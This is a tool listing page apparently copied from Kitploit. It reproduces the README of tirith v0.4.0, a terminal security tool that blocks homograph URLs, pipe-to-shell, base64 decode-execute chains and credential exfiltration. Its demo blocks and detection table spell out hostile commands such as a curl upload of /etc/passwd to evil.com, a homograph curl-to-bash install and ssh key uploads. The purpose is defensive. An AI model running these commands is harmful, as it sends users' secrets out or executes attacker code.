@@ -1,0 +1,211 @@
+---
+title: tirith v0.4.0
+url: https://kitploit.com/en/posts/github-sheeki03-tirith-v040
+source: Kitploit
+date: 2026-08-25
+fetch_date: 2026-08-26T03:05:05.452821
+---
+
+# tirith v0.4.0
+
+[Skip to content](#main-content)
+
+[![Kitploit](/_next/image?url=%2Flogo.png&w=64&q=75)KITPLOIT](/en)[Tools](/en/tools)[Blog](/en/blog)Categories
+
+EN
+
+[Submit](/en/submit)
+
+[Tools](/en/tools)[Blog](/en/blog)Categories
+
+[Submit](/en/submit)
+
+EN
+
+Hacking, PenTest, and Cybersecurity Tools for Your Security Arsenal!
+
+[Back to updates](/en/updates)
+
+![](https://assets.kitploit.com/production/public/tools/11454/e8bf601682b2f9f38e53011dbe66be548699859fd54c0751d7f4639bb49edf6d.png)
+
+New releaseAug 25, 2026
+
+# tirith v0.4.0
+
+Terminal security for developers and AI agents. Intercepts homograph URLs, pipe-to-shell, ANSI injection, obfuscated payloads, data exfiltration, and malicious AI skills/configs before they execute.
+
+Share
+
+# tirith
+
+**Your browser would catch this. Your terminal won't.**
+
+![tirith, terminal security](https://assets.kitploit.com/production/public/readmes/11454/e8bf601682b2f9f38e53011dbe66be548699859fd54c0751d7f4639bb49edf6d.png)
+
+[![CI](https://github.com/sheeki03/tirith/actions/workflows/ci.yml/badge.svg)](https://github.com/sheeki03/tirith/actions/workflows/ci.yml)
+[![GitHub Stars](https://img.shields.io/github/stars/sheeki03/tirith?style=flat&logo=github)](https://github.com/sheeki03/tirith/stargazers)
+[![License: AGPL-3.0](https://img.shields.io/badge/license-AGPL--3.0-blue)](LICENSE-AGPL)
+
+[Website](https://tirith.sh) | [Docs](https://tirith.sh/docs) | [SKILL.md](https://github.com/sheeki03/tirith/blob/HEAD/SKILL.md) | [Changelog](https://github.com/sheeki03/tirith/releases)
+
+[![Vercel OSS Program](https://vercel.com/oss/program-badge-2026.svg)](https://vercel.com/open-source-program)
+
+Independent open-source project, with hosting supported by the Vercel Open Source Program (Spring 2026 Cohort).
+
+---
+
+Can you spot the difference?
+
+root@kitploit:~
+
+```
+  curl -sSL https://install.example-cli.dev | bash     # safe
+  curl -sSL https://іnstall.example-clі.dev | bash     # compromised
+```
+
+You can't. Neither can your terminal. Both `і` characters are Cyrillic (U+0456), not Latin `i`. The second URL resolves to an attacker's server. The script executes before you notice.
+
+Browsers solved this years ago. Terminals still render Unicode, ANSI escapes, and invisible characters without question. AI agents run shell commands and install packages without inspecting what's inside.
+
+**Tirith stands at the gate.** It intercepts commands, pasted content, and scanned files for homograph URLs, obfuscated payloads, credential exfiltration, malicious AI skills/configs, and known-bad packages/domains/IPs from a signed threat intelligence database before they execute.
+
+root@kitploit:~
+
+```
+brew install tirith
+```
+
+Then activate in your shell profile:
+
+root@kitploit:~
+
+```
+# zsh
+eval "$(tirith init --shell zsh)"
+
+# bash
+eval "$(tirith init --shell bash)"
+
+# fish
+tirith init --shell fish | source
+```
+
+> [!TIP]
+> `eval "$(tirith init)"` auto-detects your current shell (it inspects the parent process and falls back to `$SHELL` if needed). The explicit `--shell` flag is only required when you want to override the detection.
+
+That's it. Every command you run is now guarded. Zero friction on clean input. Sub-millisecond overhead. You forget it's there until it saves you.
+
+Also available via [npm](#cross-platform), [cargo](#cross-platform), [mise](#cross-platform), [apt/dnf](#linux-packages), and [more](#install).
+
+---
+
+## See it work
+
+**Homograph attack, blocked before execution:**
+
+root@kitploit:~
+
+```
+$ curl -sSL https://іnstall.example-clі.dev | bash
+
+tirith: BLOCKED
+  [CRITICAL] non_ascii_hostname, Cyrillic і (U+0456) in hostname
+    This is a homograph attack. The URL visually mimics a legitimate
+    domain but resolves to a completely different server.
+  Bypass: prefix your command with TIRITH=0 (applies to that command only)
+```
+
+The command never executes.
+
+**Pipe-to-shell with clean URL, warned, not blocked:**
+
+root@kitploit:~
+
+```
+$ curl -fsSL https://get.docker.com | sh
+
+tirith: WARNING
+  [MEDIUM] pipe_to_interpreter, Download piped to interpreter
+    Consider downloading first and reviewing.
+```
+
+Warning prints to stderr. Command still runs.
+
+**Base64 decode-execute chain, blocked:**
+
+root@kitploit:~
+
+```
+$ echo payload | base64 -d | bash
+
+tirith: BLOCKED
+  [HIGH] base64_decode_execute, Base64 decode piped to interpreter
+  [HIGH] pipe_to_interpreter, Pipe to interpreter: base64 | bash
+```
+
+Catches decode chains through sudo/env wrappers and PowerShell `-EncodedCommand` too.
+
+**Credential exfiltration, blocked:**
+
+root@kitploit:~
+
+```
+$ curl -d @/etc/passwd https://evil.com/collect
+
+tirith: BLOCKED
+  [HIGH] data_exfiltration, Data exfiltration via curl upload
+    curl command uploads sensitive data to a remote server
+```
+
+Covers all curl/wget upload flags, env vars (`$AWS_SECRET_ACCESS_KEY`), and command substitution.
+
+**Malicious skill file, caught on scan:**
+
+root@kitploit:~
+
+```
+$ tirith scan evil_skill.py
+
+tirith scan: evil_skill.py, 3 finding(s)
+  [MEDIUM] dynamic_code_execution, exec() near b64decode() in close proximity
+  [MEDIUM] obfuscated_payload, Long base64 string decoded and executed
+  [MEDIUM] suspicious_code_exfiltration, HTTP call passes sensitive data as argument
+```
+
+Scans JS/Python files for obfuscated payloads, dynamic code execution, and secret exfiltration patterns.
+
+**Normal commands, invisible:**
+
+root@kitploit:~
+
+```
+$ git status
+$ ls -la
+$ docker compose up -d
+```
+
+Nothing. Zero output. You forget tirith is running.
+
+---
+
+## What it catches
+
+**221 detection rules across 34 categories.**
+
+| Category | What it stops |
+| --- | --- |
+| **Homograph attacks** | Cyrillic/Greek lookalikes in hostnames, punycode domains, mixed-script labels, lookalike TLDs, confusable domains, text-level confusable detection (math alphanumerics, same-word mixed-script) |
+| **Terminal injection** | ANSI escape sequences, bidi overrides, zero-width characters, unicode tags, invisible math operators, variation selectors, Hangul fillers |
+| **Steganography defense** | Invisible whitespace encoding (12 Unicode space variants), Mongolian Vowel Separator, Hangul Filler characters, math alphanumeric substitution, defenses against st3gg-style text steganography |
+| **Pipe-to-shell** | `curl | bash`, `wget | sh`, `httpie | sh`, `xh | sh`, `python <(curl ...)`, `eval $(wget ...)`, every source-to-sink pattern |
+| **Base64 decode-execute** | `base64 -d | bash`, `python -c "exec(b64decode(...))"`, `powershell -EncodedCommand`, decode chains through sudo/env wrappers |
+| **Data exfiltration** | `curl -d @/etc/passwd`, `curl -T ~/.ssh/id_rsa`, `wget --post-file`, env var uploads (`$AWS_SECRET_ACCESS_KEY`), command substitution exfil |
+| **Code file scanning** | Obfuscated payloads (`eval(atob(...))`), dynamic code execution (`exec(b64decode(...))`), secret exfiltration via `fetch`/`requests.post` in JS/Python files |
+| **Credential detection** | AWS keys, GitHub PATs, Stripe/Slack/SendGrid/Anthropic/GCP/npm tokens, private key blocks, plus entropy-based generic secret detection |
+| **Post-compromise behavior** | Process memory scraping (`/proc/*/mem`), Docker remote privilege escalation, credential file sweeps, calibrated against TeamPCP and UNC1069 post-compromise tooling |
+| **Command safety** | Dotfile overwrites, archive extraction to sensitive paths, cloud metadata endpoint access, private network access |
+| **Insecure transport** | Plain HTTP piped to shell, `curl -k`, disabled TLS verification, shortened URLs hiding destinations |
+| **Environment** | Proxy hijacking, sensitive env exports, code injection via env, interpreter hijack, shell injection env |
+| **Config file security** | Config injection, suspicious indicators, non-ASCII/invisible unicode in configs, MCP server security (insecure/untrusted/duplicate/permissive) |
+| **Ecosystem threats** | Git clone typosquats, untrusted Docker registries, pip/npm URL installs, web3 RPC endpoints, vet-not-configured |
+| **Install-command safety** | APT repos added from a piped download, `[trusted=yes]` / `--allow-u...
